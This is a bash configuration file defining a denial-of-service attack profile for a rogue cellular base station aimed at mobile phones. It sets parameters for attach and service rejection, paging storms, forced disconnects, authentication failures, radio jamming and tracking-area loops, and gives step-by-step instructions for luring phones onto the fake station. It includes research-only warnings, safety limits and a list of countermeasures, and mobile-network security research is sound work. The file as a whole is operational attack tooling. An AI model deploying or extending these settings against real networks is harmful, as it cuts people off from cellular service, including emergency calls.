#!/bin/bash
#####################################################################
# DENIAL OF SERVICE (DoS) ATTACK PROFILE
# 
# Purpose: Disrupt UE connectivity and prevent legitimate network access
# Method: Various techniques to deny service
#
# WARNING: For RESEARCH and EDUCATIONAL purposes ONLY
#####################################################################

# Profile name
ATTACK_NAME="Denial of Service"
ATTACK_TYPE="dos"

#####################################################################
# DoS STRATEGY
#####################################################################
# Which DoS technique to use
# Options: reject_attach, resource_exhaustion, jamming, paging_storm
DOS_TECHNIQUE="reject_attach"

#####################################################################
# ATTACH REJECTION
#####################################################################
# Reject UE attach attempts
REJECT_ATTACH_REQUESTS=true
REJECT_CAUSE=7  # GPRS services not allowed

# Reject specific UEs or all
REJECT_ALL_UES=true
REJECT_SPECIFIC_IMSI=false
REJECT_IMSI_LIST="/tmp/reject_imsi_list.txt"

# Response to attach
SEND_ATTACH_REJECT=true
SEND_TAU_REJECT=true
SEND_SERVICE_REJECT=true

#####################################################################
# RESOURCE EXHAUSTION
#####################################################################
# Exhaust UE or base station resources
RESOURCE_EXHAUSTION_ENABLED=false

# Techniques
ACCEPT_CONNECTIONS_NO_COMPLETION=false  # Accept but never complete
MAX_INCOMPLETE_CONNECTIONS=100

RAPIDLY_CYCLE_PAGING=false
PAGING_RATE_PER_SECOND=100

CREATE_EXCESSIVE_BEARERS=false
MAX_BEARERS_PER_UE=11

#####################################################################
# CONNECTION DISRUPTION
#####################################################################
# Disrupt established connections
DISRUPT_EXISTING_CONNECTIONS=false

# Disruption methods
SEND_RANDOM_RRC_RELEASE=false
SEND_DETACH_REQUESTS=false
DROP_PACKETS_RANDOMLY=false
DROP_PERCENTAGE=50

#####################################################################
# AGGRESSIVE PAGING
#####################################################################
# Flood UE with paging messages
PAGING_STORM_ENABLED=false
PAGING_RATE=50  # messages per second
PAGING_DURATION=60  # seconds

# Target specific UE or broadcast
PAGING_TARGET_IMSI=""
PAGING_BROADCAST=true

#####################################################################
# AUTHENTICATION FAILURE
#####################################################################
# Cause authentication failures
AUTHENTICATION_FAILURE_ENABLED=false

# Methods
SEND_WRONG_AUTHENTICATION=false
DELAY_AUTHENTICATION_RESPONSE=false
REJECT_AUTHENTICATION=false

#####################################################################
# RADIO JAMMING
#####################################################################
# Jam the radio channel (not recommended - very detectable)
RADIO_JAMMING_ENABLED=false
JAMMING_POWER=85  # TX gain
JAMMING_CONTINUOUS=false
JAMMING_INTERMITTENT=false
JAMMING_INTERVAL=5  # seconds on/off

#####################################################################
# TAC/PLMN BLACKLIST
#####################################################################
# Add fake cell to UE's blacklist
INDUCE_BLACKLISTING=false
SEND_MALFORMED_MESSAGES=false

#####################################################################
# TRACKING AREA UPDATE LOOP
#####################################################################
# Cause TAU/RAU loop
TAU_LOOP_ENABLED=false
CONSTANTLY_CHANGE_TAC=false
TAC_CHANGE_INTERVAL=10  # seconds

#####################################################################
# LOGGING
#####################################################################
LOG_LEVEL="info"
LOG_FILE="/tmp/dos_attack.log"

# Statistics
TRACK_REJECTED_UES=true
TRACK_DISRUPTED_CONNECTIONS=true
STATS_FILE="/tmp/dos_stats.json"

# Alert on activity
ALERT_ON_UE_ATTEMPT=true
ALERT_ON_REJECTION=true

#####################################################################
# PCAP CAPTURE
#####################################################################
PCAP_ENABLED=true
PCAP_FILE="/tmp/dos_attack.pcap"

#####################################################################
# SAFETY LIMITS
#####################################################################
# Prevent excessive disruption
MAX_REJECTIONS_PER_MINUTE=100
AUTO_STOP_AFTER_MINUTES=10
EMERGENCY_STOP_FILE="/tmp/dos_emergency_stop"

#####################################################################
# DESCRIPTION
#####################################################################
ATTACK_DESCRIPTION="Denial of Service attack prevents UEs from accessing network services through various disruption techniques."

ATTACK_HOWTO="1. Choose DoS technique (edit DOS_TECHNIQUE above)
2. Configure technique-specific parameters
3. Start false BS with this profile
4. UE will connect to false BS (higher signal)
5. False BS executes DoS technique
6. UE unable to access network services
7. Statistics logged to ${STATS_FILE}"

ATTACK_COUNTERMEASURES="- Detect and blacklist rogue base stations
- Implement base station authentication
- Monitor for unusual attach rejections
- Use multiple carriers/bands for redundancy
- Alert users to suspicious network behavior
- Automatic fallback to other cells
- Report suspicious activity to operator"

ATTACK_WARNING="DoS attacks can affect emergency services. Use only in controlled, isolated environments for research purposes."

